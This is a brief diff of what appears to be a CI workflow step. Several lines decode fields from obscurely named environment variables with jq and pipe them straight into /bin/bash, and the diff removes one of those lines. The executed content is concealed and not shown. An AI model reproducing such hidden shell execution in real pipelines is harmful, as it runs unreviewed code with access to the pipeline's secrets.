@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$tuzpt70" | jq -r .m9 | /bin/bash
           echo $kxc924 | jq -r .fwyap65 | /bin/bash
-          printf '%s' "$wg53" | jq -r .uvw864 | /bin/bash
           printf '%s' "$hvtat64" | jq -r .b2624 | /bin/bash
 
       - name: Save data
